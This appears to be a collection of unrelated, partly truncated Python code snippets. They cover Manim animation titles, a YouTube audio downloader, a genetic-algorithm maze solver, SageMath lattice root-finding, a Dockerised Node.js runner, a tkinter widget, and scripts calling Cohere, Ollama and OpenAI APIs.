    "from ..my_imports import *\n\n__all__=['Title_General']\n\nclass Title_General(VGroup):\n    \"\"\"Class to load all inputs for the subsequent classes of titles (main and sections).\n    \n    - **Parameters**::\n   \n        - text_size (float, optional): Defaults to 25.\n        - text_color (ParsableManimColor, optional): Defaults to WHITE.\n        - decorator_presence (str, optional): This has several options (Defaults to no)\n            - \"box\": A simple surrounding rectangle around the title.\n            - \"box_long_left\"/\"box_long_right\": A surrounding rectangle that stretches\n              to the chosen corner.\n            - \"back_frame\": A whole back frame behind the text, spanning from side to side.\n            - \"no\": Nothing. Plain text. \n        - decorator_color (ParsableManimColor, optional): Defaults to WHITE.\n        - decorator_stroke_width (float, optional): Defaults to 1.\n        - corner_rad (float, optional): Corner radious of surrounding box. Defaults to 0.\n        - corner_rad_direction (list, optional): which corners of the surrounding rectangle\n        get rounded. Defaults to [0, 0, 0, 0].\n        - fill_opa (float, optional): Fill opacity of the surrounding box. Defaults to 0.1.\n        - tightness (float, optional): How tight the box around the title is. Defaults to 0.3.\n        - stroke_opa (float, optional): Opacity of the strokes. Defaults to 1.\n    \n    \"\"\" \n     \n    def __init__(self,\n                 text_size: float= 25,\n                 text_color: ParsableManimColor= WHITE,\n                 decorator_presence: str= \"no\",\n                 decorator_color: ParsableManimColor= WHITE,\n                 decorator_stroke_width: float= 1,\n                 corner_rad: float= 0,\n                 corner_rad_direction: list= [0, 0, 0, 0],\n                 fill_opa: float= 0.1,\n                 tightness: float= 0.3,\n                 stroke_opa: float= 1,\n                 **kwargs)-> VGroup:\n        \n        super().__init__(**kwargs)\n        self.text_size= text_size\n        self.text_color= text_color\n        self.decorator_presence= decorator_presence\n        self.decorator_color= decorator_color\n        self.fill_opa= fill_opa\n        self.tightness= tightness\n        self.decorator_stroke_width= decorator_stroke_width\n        self.stroke_opa= stroke_opa\n        self.corner_rad= list(corner_rad*np.array(corner_rad_direction))",
    "import os\nimport sys\nimport time\nimport shutil\nimport colorama\nfrom colorama import Fore, Style\nfrom yt_dlp import YoutubeDL\nfrom moviepy.editor import VideoFileClip\nfrom shutil import which\nfrom pyfiglet import Figlet\n\ncolorama.init(autoreset=True)\n\nDOWNLOAD_FOLDER = \"downloads\"\nVIDEOS_FOLDER = \"videos\"\n\ndef clear_console():\n    \"\"\"\n    Clears the console screen.\n    \"\"\"\n    os.system('cls' if os.name == 'nt' else 'clear')\n\ndef display_banner():\n    \"\"\"\n    Displays the 'YT CONVERT' banner using ASCII art and adds a credit line below it.\n    \"\"\"\n    f = Figlet(font='slant')  # Puedes cambiar la fuente aqu\u00ed si lo deseas\n    banner = f.renderText('YT CONVERT')\n    credit = \"\ud83d\udc51 Script Created by Naeaex - Follow me on Github for more scripts www.github.com/Naeaerc20\"\n    print(f\"{Fore.GREEN}{banner}{Style.RESET_ALL}\")\n    print(f\"{Fore.GREEN}{credit}{Style.RESET_ALL}\")\n\ndef print_progress_bar(percentage, bar_length=40):\n    \"\"\"\n    Prints a progress bar to the console.\n    \"\"\"\n    filled_length = int(bar_length * percentage // 100)\n    bar = '#' * filled_length + '-' * (bar_length - filled_length)\n    print(f\"\\r[{bar}] {percentage:.2f}% \", end='')\n\ndef progress_hook(d):\n    \"\"\"\n    Hook function to handle progress updates from yt_dlp.\n    \"\"\"\n    if d['status'] == 'downloading':\n        if d.get('total_bytes'):\n            total = d['total_bytes']\n        elif d.get('total_bytes_estimate'):\n            total = d['total_bytes_estimate']\n        else:\n            total = None\n\n        if total:\n            percentage = d['downloaded_bytes'] / total * 100\n            print_progress_bar(percentage)\n    elif d['status'] == 'finished':\n        print_progress_bar(100)\n        print()  # Move to the next line\n\ndef convert_mp4_to_mp3(mp4_path, mp3_path):\n    \"\"\"\n    Convert an MP4 file to MP3 using MoviePy.\n    \"\"\"\n    try:\n        with VideoFileClip(mp4_path) as video:\n            audio = video.audio\n            if audio is None:\n                print(f\"{Fore.RED}Error: No audio track found!\")\n                return False\n            audio.write_audiofile(mp3_path)\n        return True\n    except Exception as e:\n        print(f\"{Fore.RED}Error during conversion: {e}\")\n        return False\n\ndef sanitize_filename(name):\n    \"\"\"\n    Sanitize the filename by removing invalid characters.\n    \"\"\"\n    return \"\".join(c for c in name if c.isalnum() or c in \" .-_\").rstrip()\n\ndef check_ffmpeg_installed():\n    \"\"\"\n    Check if FFmpeg is installed and accessible.\n    \"\"\"\n    if which('ffmpeg') is None:\n        print(f\"{Fore.RED}[ERROR] FFmpeg is not installed. Please install FFmpeg to proceed.\")\n        sys.exit(1)\n\ndef prompt_user_choice(prompt, choices):\n    \"\"\"\n    Prompt the user with a question and return their choice.\n    \"\"\"\n    choice = ''\n    while choice not in choices:\n        choice = input(prompt).strip().lower()\n        if choice not in choices:\n            print(f\"{Fore.RED}Invalid choice. Please enter one of {', '.join(choices).upper()}.\\n\")\n    return choice\n\ndef main():\n    clear_console()\n    check_ffmpeg_installed()\n    display_banner()\n\n    while True:\n        print(f\"{Fore.YELLOW}Welcome to the {Style.BRIGHT}YouTube MP4-to-MP3 Converter!\")\n        youtube_url = input(f\"{Fore.GREEN}Please enter the YouTube video URL: {Style.RESET_ALL}\").strip()\n\n        if not youtube_url:\n            print(f\"{Fore.RED}[ERROR] No URL entered. Please try again.\\n\")\n            continue\n\n        # Prompt for filename choice\n        filename_choice = prompt_user_choice(\n            \"Do you want to use the video title as the filename? (Y/N): \",\n            ['y', 'n']\n        )\n\n        # Initialize base_name\n        base_name = \"\"\n\n        # Temporary ydl_opts to fetch video info without setting outtmpl\n        temp_ydl_opts = {\n            'format': 'bestvideo+bestaudio/best',\n            'noplaylist': True,\n            'quiet': True,\n            'no_warnings': True,\n        }\n\n        try:\n            print(f\"\\n{Fore.BLUE}[INFO] {Style.RESET_ALL}Fetching video information...\")\n            with YoutubeDL(temp_ydl_opts) as ydl:\n                info_dict = ydl.extract_info(youtube_url, download=False)\n                uploader = info_dict.get('uploader', 'Unknown')\n                print(f\"{Fore.MAGENTA}[INFO]{Style.RESET_ALL} Channel: {uploader}\")\n                if filename_choice == 'y':\n                    base_name = sanitize_filename(info_dict.get('title', 'downloaded_video'))\n                else:\n                    custom_name = input(f\"{Fore.GREEN}Please enter your desired filename (without extension): {Style.RESET_ALL}\").strip()\n                    if not custom_name:\n                        print(f\"{Fore.RED}[ERROR] No filename entered. Using video title as fallback.\\n\")\n                        base_name = sanitize_filename(info_dict.get('title', 'downloaded_video'))\n                    else:\n                        base_name = sanitize_filename(custom_name)\n        except Exception as e:\n            print(f\"{Fore.RED}[ERRO",
    "# Install necessary libraries\n!pip install matplotlib deap\nimport random\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom deap import base, creator, tools, algorithms\n# Define the maze\nmaze = [\n    [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0],\n    [1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0],\n    [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0],\n    [1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0],\n    [1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0],\n    [1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0],\n    [1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0],\n    [1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0],\n    [1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0],\n    [1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0],\n    [0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0]\n]\n\n# Start and end points\nstart, end = (0, 0), (len(maze)-1, len(maze[0])-1)\n# Genetic Algorithm setup\ncreator.create(\"FitnessMin\", base.Fitness, weights=(-1.0,))\ncreator.create(\"Individual\", list, fitness=creator.FitnessMin)\n\ntoolbox = base.Toolbox()\ntoolbox.register(\"attr_direction\", random.choice, ['U', 'D', 'L', 'R'])\ntoolbox.register(\"individual\", tools.initRepeat, creator.Individual, toolbox.attr_direction, n=100)\ntoolbox.register(\"population\", tools.initRepeat, list, toolbox.individual)\ndef evaluate(individual):\n    x, y = start\n    for move in individual:\n        # Move up, down, left, or right while checking boundaries\n        if move == 'U': y = max(0, y - 1)\n        elif move == 'D': y = min(len(maze) - 1, y + 1)\n        elif move == 'L': x = max(0, x - 1)\n        elif move == 'R': x = min(len(maze[0]) - 1, x + 1)\n\n        # Check if the current position is the end goal\n        if (x, y) == end:\n            return (0,)  # Perfect score since we reached the end\n\n        # Check if the current position is a wall\n        if maze[y][x] == 1:\n            break\n\n    # Return the Manhattan distance to the end point as the score\n    return (abs(end[0] - x) + abs(end[1] - y),)\ndef custom_mutate(individual, indpb=0.2):\n    directions = ['U', 'D', 'L', 'R']\n    for i in range(len(individual)):\n        if random.random() < indpb:\n            # Exclude the current direction to ensure mutation changes the gene\n            possible_directions = [d for d in directions if d != individual[i]]\n            individual[i] = random.choice(possible_directions)\n    return individual,\ntoolbox.register(\"evaluate\", evaluate)\ntoolbox.register(\"select\", tools.selTournament, tournsize=3)\ntoolbox.register(\"mate\", tools.cxUniform, indpb=0.5)\ntoolbox.register(\"mutate\", custom_mutate, indpb=0.2)\n# Function to visualize the maze and path\ndef plot_path(individual):\n    x, y = start\n    plt.plot(x, y, \"go\")  # start point\n    for move in individual:\n        # Attempt the move\n        next_x, next_y = x, y\n        if move == 'U': next_y = max(0, y - 1)\n        elif move == 'D': next_y = min(len(maze) - 1, y + 1)\n        elif move == 'L': next_x = max(0, x - 1)\n        elif move == 'R': next_x = min(len(maze[0]) - 1, x + 1)\n\n        # Check for wall collision before plotting the move\n        if maze[next_y][next_x] == 1 or (next_x, next_y) == end: break\n        # No collision, so make the move and plot it\n        x, y = next_x, next_y\n        # plt.plot(x, y, \"bo\")\n\n    plt.plot(end[0], end[1], \"ro\")  # end point\n    plt.imshow(maze, cmap=\"binary\")\n    plt.show()\n# Run the genetic algorithm\ndef run_ga(generations=2000, pop_size=50):\n    pop = toolbox.population(n=pop_size)\n    best_individuals = []\n    for gen in range(generations):\n        offspring = algorithms.varAnd(pop, toolbox, cxpb=0.5, mutpb=0.2)\n        fits = toolbox.map(toolbox.evaluate, offspring)\n        for fit, ind in zip(fits, offspring):\n            ind.fitness.values = fit\n        pop = toolbox.select(offspring, k=len(pop))\n        top_individual = tools.selBest(pop, k=1)[0]\n        best_individuals.append(top_individual)\n\n        if gen in [2, 10, 50, 100, 500] or gen == generations - 1:\n            print(f\"Generation {gen}:\")\n            plot_path(top_individual)\nrun_ga()\n",
    "import shutil\nimport subprocess\nimport re\nimport logging\n\nfrom sage.misc.converting_dict import KeyConvertingDict\nfrom sage.all import matrix, ZZ, DiGraph, Infinity, prod, Sequence, PolynomialRing, TermOrder, QQ\n\nfrom functools import lru_cache\nfrom collections import defaultdict\nfrom subprocess import CalledProcessError\n\n\nlogger = logging.getLogger(__name__)\nlogging.basicConfig(level=logging.INFO, format='%(uptime)f [%(levelname)s]: %(message)s')\n\nold_factory = logging.getLogRecordFactory()\ndef record_factory(*args, **kwargs):\n    record = old_factory(*args, **kwargs)\n    record.uptime = record.relativeCreated/1000\n    return record\nlogging.setLogRecordFactory(record_factory)\n\n@lru_cache(None)\ndef warn_once(logger, msg):\n    logger.warning(msg)\n\n\nflatter_path = shutil.which('flatter')\n\n# test if msolve is installed\ntry:\n    QQ['x,y'].ideal([1]).groebner_basis(algorithm='msolve', proof=False)\n    msolve_available = True\nexcept CalledProcessError:\n    logger.warning('msolve not found by Sage, equation solving will likely be slower')\n    msolve_available = False\n\n\ndef flatter(M, flatter_path=flatter_path):\n    inp_str = '[' + '\\n'.join('[' + ' '.join(map(str, row)) + ']' for row in M) + ']'\n    out_str = subprocess.check_output([flatter_path], input=inp_str.encode())\n    return matrix(ZZ, M.nrows(), M.ncols(), map(ZZ, re.findall(r'-?\\d+', out_str.decode())))\n\n\ndef groebner_ZZ(I):\n    # TODO: add magma support\n    return I.groebner_basis()\n\n\ndef groebner_QQ(I):\n    '''\n    Return a new ideal with either the Gr\u00f6bner basis of I\n    as generators\n    '''\n    if msolve_available:\n        gb = I.groebner_basis(algorithm='msolve', proof=False)\n    else:\n        gb = I.groebner_basis()\n    return I.parent()(gb)\n\n\ndef variety_ZZ(I):\n    '''\n    Return the variety of I\n    '''\n    if msolve_available:\n        vari = I.variety(algorithm='msolve', proof=False)\n    else:\n        vari = I.variety()\n    return [\n        KeyConvertingDict(str, {str(k): ZZ(v) for k, v in sol.items()})\n        for sol in vari if all(sol.is_integer() for sol in sol.values())\n    ]\n\n\ndef LLL(M, **kwargs):\n    return M.LLL(**kwargs)\n\n\ndef BKZ(M, **kwargs):\n    return M.BKZ(**kwargs)\n\n\ndef lg2(n):\n    return ZZ(abs(n) - 1).nbits()\n\n\ndef common_ZZ_ring(polys):\n    var_names = set().union(*({str(x) for x in p.variables()} for p in polys))\n    return PolynomialRing(ZZ, len(var_names), tuple(var_names))\n\n\ndef optimal_shift_polys(G, M):\n    S = []\n    for m in M:\n        g = min((g for g in G if g.lm().divides(m)), key=lambda g: g.lc(), default=None)\n        if g is None:\n            raise ValueError('ideal behaves unexpectedly, please report this')\n        h = g * (m // g.lm())\n        hprim = h.lt() + (h - h.lt()).reduce(G)\n        S.append(hprim)\n    return S\n\n\ndef suitable_subset(MS, X):\n    G = DiGraph(len(MS) + 2, weighted=True)\n\n    S = [s for _, s in MS]\n    M_idx = {m: i for i, (m, _) in enumerate(MS)}\n    nmonos = len(MS)\n\n    poly_weights = [ZZ(lg2(f.lt()(X))) for f in S]\n    off = sum(poly_weights) / len(S)\n    vert_weights = [off - w for w in poly_weights]\n\n    # Reduce maximum-closure to minimum-cut like described in\n    # https://en.wikipedia.org/wiki/Closure_problem#Reduction_to_maximum_flow\n    for f in S:\n        m1 = f.lm()\n        i1 = M_idx[m1]\n        wm = vert_weights[i1]\n        if wm > 0:\n            G.add_edge(nmonos, i1, wm)\n        else:\n            G.add_edge(i1, nmonos+1, -wm)\n\n        for m2 in f.monomials():\n            if m1 == m2:\n                continue\n            i2 = M_idx[m2]\n            G.add_edge(i1, i2, Infinity)\n    \n    parts = G.edge_cut(nmonos, nmonos+1, value_only=False, use_edge_labels=True, vertices=True)[2]\n    closure = set(next(c for c in parts if nmonos in c))\n    closure -= {nmonos, nmonos+1}\n\n    if sum(vert_weights[i] for i in closure) == 0:\n        return None\n    return [MS[i] for i in closure]\n\n\ndef find_exps(assignemnt, remaining, weights):\n    i = len(assignemnt)\n    if i == len(weights):\n        yield assignemnt\n        return\n\n    weight = weights[i]\n    for j in range(remaining + 1):\n        new_remaining = remaining - j * weight\n        if new_remaining < 0:\n            break\n        yield from find_exps(assignemnt + (j,), new_remaining, weights)\n\n\ndef small_polys(inp_polys, sizes, ks=None, mod_bounds=None, lat_reduce=flatter, graph_search_lim=None, ret_start_hint=False):\n    '''\n    Given a list of polynomials, possible over different rings, finds\n    small solutions to the system of equations. The polynomials may be defined\n    over ZZ, QQ or Zmod(N) (even for different N).\n\n    Matching of variables across different rings is done by name (as strings).\n\n    Args:\n        inp_polys: list of polynomials\n        sizes: dict mapping variable names to their sizes (in no. bits)\n        ks: dict mapping moduli to exponent multiplicity in the ideal (1 if\n            not present)\n        mod_bounds: dict mapping moduli to bound on the divisor we want roots\n            modulo (in no. bits)\n     ",
    "\"\"\"Tool to execute Node.js scripts in an isolated Docker environment.\"\"\"\n\nimport json\nimport logging\nimport os\nimport subprocess\nimport tempfile\n\nfrom quantalogic.tools.tool import Tool, ToolArgument\n\n# Configure logging for the module\nlogger = logging.getLogger(__name__)\n\n\nclass NodeJsTool(Tool):\n    \"\"\"Tool to execute Node.js scripts in an isolated Docker environment.\"\"\"\n\n    name: str = \"nodejs_tool\"\n    description: str = (\n        \"Executes a Node.js script (ESM or CommonJS) within a Docker container using npm for package management.\\n\\n\"\n        \"CONSOLE OUTPUT REQUIREMENTS:\\n\"\n        \"1. Only Node.js code that produces text output via console.log() statements is accepted\\n\"\n        \"2. No GUI, no plots, no visualizations - strictly console/terminal output\\n\"\n        \"3. No file operations or external resources unless explicitly authorized\\n\\n\"\n        \"EXECUTION ENVIRONMENT:\\n\"\n        \"- Runs in an isolated Docker container\\n\"\n        \"- Node.js version can be specified (default: Node.js LTS)\\n\"\n        \"- Required packages can be installed via npm\\n\"\n        \"- Standard Node.js modules are available\\n\\n\"\n        \"ACCEPTED OUTPUT METHODS:\\n\"\n        \"\u2713 console.log()\\n\"\n        \"\u2713 console.info()\\n\"\n        \"\u2713 process.stdout.write()\\n\"\n        \"\u2717 No browser-based output\\n\"\n        \"\u2717 No external file generation\\n\"\n        \"\u2717 No web servers or network services\\n\\n\"\n        \"EXAMPLE:\\n\"\n        \"console.log('Hello, World!')  # \u2713 Valid\\n\"\n        \"window.alert()                # \u2717 Invalid\\n\"\n    )\n    need_validation: bool = True\n    arguments: list[ToolArgument] = [\n        ToolArgument(\n            name=\"install_commands\",\n            arg_type=\"string\",\n            description=(\n                \"Commands to install Node.js packages before running the script. \"\n                \"Use one command per line or separate packages with spaces.\"\n            ),\n            required=False,\n            example=\"npm install chalk axios\",\n        ),\n        ToolArgument(\n            name=\"script\",\n            arg_type=\"string\",\n            description=(\n                \"The Node.js script to execute. The script must print to the console. \"\n                \"Use import statements for ESM or require statements for CommonJS.\"\n            ),\n            required=True,\n            example='import fs from \"fs\";\\nconsole.log(\"Hello, World!\");\\nconsole.log(\"This is a Node.js interpreter tool.\");',\n        ),\n        ToolArgument(\n            name=\"version\",\n            arg_type=\"string\",\n            description=(\"The Node.js version to use in the Docker container. \" \"For example:  '18', '20', 'lts'.\"),\n            required=True,\n            default=\"lts\",\n            example=\"20\",\n        ),\n        ToolArgument(\n            name=\"host_dir\",\n            arg_type=\"string\",\n            description=(\n                \"The absolute path on the host machine to mount for file access. \"\n                \"Provide this path if you want to access files on the host.\"\n            ),\n            required=False,\n            default=os.getcwd(),\n            example=\"./project/\",\n        ),\n        ToolArgument(\n            name=\"memory_limit\",\n            arg_type=\"string\",\n            description=(\n                \"Optional memory limit for the Docker container (e.g., '512m', '2g'). \"\n                \"If not specified, Docker's default memory limit applies.\"\n            ),\n            required=False,\n            default=None,\n            example=\"1g\",\n        ),\n        ToolArgument(\n            name=\"environment_vars\",\n            arg_type=\"string\",\n            description=(\n                \"Environment variables to set inside the Docker container. \"\n                \"Provide as KEY=VALUE pairs separated by spaces.\"\n            ),\n            required=False,\n            default=None,\n            example=\"NODE_ENV=production DEBUG=false\",\n        ),\n        # New Argument for Module Type\n        ToolArgument(\n            name=\"module_type\",\n            arg_type=\"string\",\n            description=(\"The module system to use: 'esm' for ECMAScript Modules or 'commonjs' for CommonJS.\"),\n            required=True,\n            default=\"esm\",\n            example=\"commonjs\",\n        ),\n    ]\n\n    def execute(\n        self,\n        install_commands: str | None = None,\n        script: str = \"\",\n        version: str = \"lts\",\n        host_dir: str | None = None,\n        memory_limit: str | None = None,\n        environment_vars: str | None = None,\n        module_type: str = \"esm\",\n    ) -> str:\n        \"\"\"Executes a Node.js script (ESM or CommonJS) within a Docker container using npm for package management.\n\n        Args:\n            install_commands (str | None): Installation commands for dependencies.\n            script (str): The Node.js script to execute.\n            version (str): Node.js version to use.\n            host_dir (str | None): Host directory to mount for file access.\n            memory_limit (str | None): Memory limit for Docker container ",
    "import customtkinter as ctk\nimport tkinter as tk\nfrom PIL import Image  # Import the Image class from Pillow\n\n# Create the main application window\napp = ctk.CTk()\napp.title(\"Hover to Reveal\")\n\n# Get screen dimensions\nscreen_width = app.winfo_screenwidth()\nscreen_height = app.winfo_screenheight()\n\n# Calculate vertical center of the screen\nvertical_center = (screen_height // 2) - 15  # Subtract half the height of the app (15px for 30px total height)\n\n# Set the initial position to the left side, vertically centered\napp.geometry(f\"200x30+0+{vertical_center}\")\n\n# Remove the title bar and window decorations\napp.overrideredirect(True)\n\n# Set the window to always be on top\napp.wm_attributes('-topmost', 1)\n\n# Load the image using Pillow\narrow_image_path = \"images/arrows-of-four-direction.jpg\"\narrow_pil_image = Image.open(arrow_image_path)  # Open the image file\narrow_image = ctk.CTkImage(light_image=arrow_pil_image, size=(30, 30))  # Convert to CTkImage\n\n# Variable to track if the button is being held\nbutton_pressed = False\n\n# Function to handle moving the window\ndef start_move(event):\n    if not button_pressed:  # Only allow move if the button is not pressed\n        app.x = event.x\n        app.y = event.y\n\ndef move_window(event):\n    if not button_pressed:  # Only allow move if the button is not pressed\n        app.geometry(f\"+{app.winfo_x() + event.x - app.x}+{app.winfo_y() + event.y - app.y}\")\n\n# Function to set opacity to 100% on hover\ndef on_enter(event):\n    app.wm_attributes('-alpha', 1.0)\n\n# Function to reduce opacity when not hovering\ndef on_leave(event):\n    app.wm_attributes('-alpha', 1.0)  # Keep at 100% initially\n    app.after(1000, lambda: app.wm_attributes('-alpha', 0.2))  # Reduce to 20% after 1 second\n\n# Function to snap the window to the edge of the screen and adjust layout\ndef snap_to_edge():\n    window_x = app.winfo_x()\n\n    if window_x < screen_width / 2:  # If the window is in the left half\n        app.geometry(f\"+0+{app.winfo_y()}\")  # Snap to the left edge\n        left_image_label.pack(side=tk.RIGHT)  # Show the left image\n        right_image_label.pack_forget()  # Hide the right image\n        main_button.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)  # Attach main button to the left edge\n    else:  # If the window is in the right half\n        app.geometry(f\"+{screen_width - app.winfo_width()}+{app.winfo_y()}\")  # Snap to the right edge\n        right_image_label.pack(side=tk.LEFT)  # Show the right image\n        left_image_label.pack_forget()  # Hide the left image\n        main_button.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)  # Attach main button to the right edge\n\n# Create a frame to hold the components\nframe = ctk.CTkFrame(app)\nframe.pack(fill=tk.BOTH, expand=True)\n\n# Create left image label (just an image, no button)\nleft_image_label = ctk.CTkLabel(frame, image=arrow_image, text=\"\")\n\n# Create main button\nmain_button = ctk.CTkButton(frame, text=\"Main\", command=lambda: print(\"Main button clicked!\"))\n\n# Create right image label (just an image, no button)\nright_image_label = ctk.CTkLabel(frame, image=arrow_image, text=\"\")\n\n# Set button press state on button press/release\ndef on_button_press(event):\n    global button_pressed\n    button_pressed = True\n\ndef on_button_release(event):\n    global button_pressed\n    button_pressed = False\n\n# Initial layout\nleft_image_label.pack_forget()  # Hide left image initially\nmain_button.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)\nright_image_label.pack(side=tk.LEFT)\n\n# Adjust the window height to match the button height\ndef adjust_window_height():\n    app.geometry(f\"{app.winfo_width()}x{main_button.winfo_height()}\")\n\napp.after(10, adjust_window_height)\n\n# Set initial opacity to 100% for 10 seconds, then reduce to 20%\napp.wm_attributes('-alpha', 1.0)\napp.after(10000, lambda: app.wm_attributes('-alpha', 0.2))  # After 10 seconds, set opacity to 20%\n\n# Bind hover events for the frame\nframe.bind(\"<Enter>\", on_enter)\nframe.bind(\"<Leave>\", on_leave)\n\n# Bind window dragging\napp.bind(\"<Button-1>\", start_move)\napp.bind(\"<B1-Motion>\", move_window)\n\n# Bind the window to snap to the edge when it is released\napp.bind(\"<ButtonRelease-1>\", lambda event: snap_to_edge())\n\n# Bind button press and release to toggle the drag behavior\nmain_button.bind(\"<ButtonPress-1>\", on_button_press)\nmain_button.bind(\"<ButtonRelease-1>\", on_button_release)\n\n# Start the application\napp.mainloop()\n",
    "import cohere\nfrom cohere import ClassifyExample\nimport os\nimport polars as pl\nimport itertools as it\nfrom tqdm import tqdm\n\ndef label_titles_test():\n    df = pl.read_csv(\"unlabelled_data.csv\")\n    small_df = df.head(n=300).sample(fraction=1, shuffle=True)\n\n    train_df = small_df.head(n=290)\n    test_df = small_df.tail(n=10)\n\n    examples = []\n    inputs = []\n    preds = []\n\n    for row in train_df.select([\"video_title\", \"needs_wiki_article\"]).rows():\n        elem = ClassifyExample(text=row[0], label=row[1])\n        examples.append(elem)\n\n    api_key = os.getenv(\"COHERE_API_KEY\")\n    co = cohere.Client(api_key=api_key)\n\n    test = [row[0] for row in test_df.select([\"video_title\", \"needs_wiki_article\"]).rows()]\n    actual = [row[1] for row in test_df.select([\"video_title\", \"needs_wiki_article\"]).rows()]\n\n    response = co.classify(\n        inputs=test,\n        examples=examples,\n    )\n\n    for elem in response.classifications:\n       # print(\"Input: \", elem.input)\n       # print(\"Label: \", elem.prediction)\n\n       if elem.input:\n           inputs.append(elem.input)\n           preds.append(elem.prediction)\n\n    print(\"Accuracy: \", (sum(1 for i in range(10) if preds[i] == actual[i]) / 10) * 100)\n\n\ndef label_titles():\n    df = pl.read_csv(\"unlabelled_data.csv\")\n    train_df = df.head(n=300)\n    unlabelled_df = df.tail(n=3421)\n\n    examples = []\n    inputs = []\n    preds = []\n\n    for row in train_df.select([\"video_title\", \"needs_wiki_article\"]).rows():\n        elem = ClassifyExample(text=row[0], label=row[1])\n        examples.append(elem)\n\n    api_key = os.getenv(\"COHERE_API_KEY\")\n    co = cohere.Client(api_key=api_key)\n    video_titles = [row[0] for row in unlabelled_df.select(\"video_title\").rows()]\n\n    for batch in tqdm(it.batched(video_titles, n=96)):\n        response = co.classify(\n            inputs=batch,\n            examples=examples,\n        )\n\n        for elem in response.classifications:\n            if elem.input:\n                inputs.append(elem.input)\n                preds.append(elem.prediction)\n\n    res_df = pl.DataFrame({\"video_title\": inputs, \"needs_wiki_article\": preds})\n    res_df.write_csv(\"labelled_data.csv\")\n\n\ndef merge_all_data():\n    labelled_df = pl.read_csv(\"labelled_data.csv\")\n    unlabelled_df = pl.read_csv(\"unlabelled_data.csv\")\n    video_titles = []\n    needs_wiki_article_list = []\n\n    for row in unlabelled_df.select([\"video_title\", \"needs_wiki_article\"]).head(n=300).rows() + labelled_df.select([\"video_title\", \"needs_wiki_article\"]).rows():\n        video_titles.append(row[0])\n        needs_wiki_article_list.append(row[1])\n\n    final_df = pl.DataFrame({\n        \"video_title\": video_titles,\n        \"needs_wiki_article\": needs_wiki_article_list,\n        \"wiki_url\": unlabelled_df[\"wiki_url\"],\n        \"video_url\": unlabelled_df[\"video_url\"]\n    })\n\n    final_df.write_csv(\"final_data.csv\")\n\n\ndef main():\n    merge_all_data()\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import base64\nfrom pathlib import Path\nfrom ollama import Client\n\n\ndef image_to_base64(image_path):\n    with open(image_path, \"rb\") as image_file:\n        return base64.b64encode(image_file.read()).decode(\"utf-8\")\n\n\ndef analyze_image(image_path, query):\n    client = Client(host=\"http://localhost:11434\")\n\n    # Convert image to base64\n    image_b64 = image_to_base64(image_path)\n\n    # Create message with image\n    response = client.chat(\n        model=\"llama3.2-vision:11b\",\n        messages=[{\"role\": \"user\", \"content\": query, \"images\": [image_b64]}],\n    )\n\n    return response[\"message\"][\"content\"]\n\n\n# Image path\nimage_path = \"output/ACCENTURE-Marker/_page_7_Figure_6.jpeg\"\n\n# Analysis queries\nqueries = [\n    \"What charts or graphs do you see in this image?\",\n    \"Describe any visual trends in the data shown\",\n    \"What are the key visual elements that stand out?\",\n]\n\n# Run analysis\nfor query in queries:\n    print(f\"\\nQuery: {query}\")\n    print(f\"Analysis: {analyze_image(image_path, query)}\")\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nimport json\nfrom openai import OpenAI\nfrom dotenv import load_dotenv\nfrom pathlib import Path\n\n# ---------------------------------------------------------------------\n# 1. CONFIGURATION: PATHS, API KEYS, ETC.\n# ---------------------------------------------------------------------\n\nload_dotenv()\n\nJSON_FILE_PATH = \"data/result_small.json\"\nOUTPUT_DIRECTORY = \"MyInterestsVault\"\n\nPROMPT_ANALYSIS_FILE = \"prompts/analysis_prompt.txt\"\n\nOBSIDIAN_CONFIG = {\n    \"name\": \"MyInterestsVault\",\n    \"dir\": \".obsidian\",\n    \"settings\": {\n        \"core-plugins\": {\n            \"file-explorer\": True,\n            \"search\": True,\n        },\n        \"theme\": \"obsidian\",\n    },\n}\n\n# ---------------------------------------------------------------------\n# 2. HELPER FUNCTIONS\n# ---------------------------------------------------------------------\n\ndef simplify_json(data_str):\n    data = json.loads(data_str)\n    simplified_messages = []\n\n    for message in data.get(\"messages\", []):\n        text_content = \"\"\n        links = []\n        \n        for part in message.get(\"text\", []):\n            if isinstance(part, str):\n                text_content += part\n            elif isinstance(part, dict) and part.get(\"type\") == \"link\":\n                links.append(part.get(\"text\"))\n\n        simplified_messages.append({\n            \"date\": message.get(\"date\"),\n            \"text\": text_content.strip(),\n            \"links\": links\n        })\n\n    return json.dumps(simplified_messages, indent=4)\n\ndef load_prompt_from_file(file_path: str) -> str:\n    print(f\"[DEBUG] Loading prompt from: {file_path}\")\n    try:\n        with open(file_path, \"r\", encoding=\"utf-8\") as f:\n            return f.read()\n    except FileNotFoundError:\n        print(f\"[ERROR] Prompt file not found: {file_path}\")\n        return \"\"\n\ndef call_chatgpt_api(prompt: str, max_tokens: int = 400000, temperature: float = 0.7):\n    print(f\"[DEBUG] Sending prompt to ChatGPT API. Max tokens: {max_tokens}, Temperature: {temperature}\")\n    try:\n        client = OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n        completion = client.chat.completions.create(\n            messages=[{\"role\": \"user\", \"content\": prompt}],\n            